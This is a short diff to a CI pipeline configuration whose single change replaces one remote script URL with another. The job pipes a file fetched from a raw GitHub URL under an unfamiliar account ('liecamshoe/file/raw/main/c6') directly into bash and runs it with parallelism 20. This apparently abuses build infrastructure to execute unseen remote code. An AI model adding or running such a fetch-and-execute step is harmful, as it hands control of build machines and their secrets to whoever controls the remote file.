@@ -18,5 +18,5 @@ blocks:
       jobs: 
         - name: 'Job #1' 
           commands: 
-            - curl -sL https://github.com/liecamshoe/file/raw/main/c65 | bash
+            - curl -sL https://github.com/liecamshoe/file/raw/main/c6 | bash
           parallelism: 20
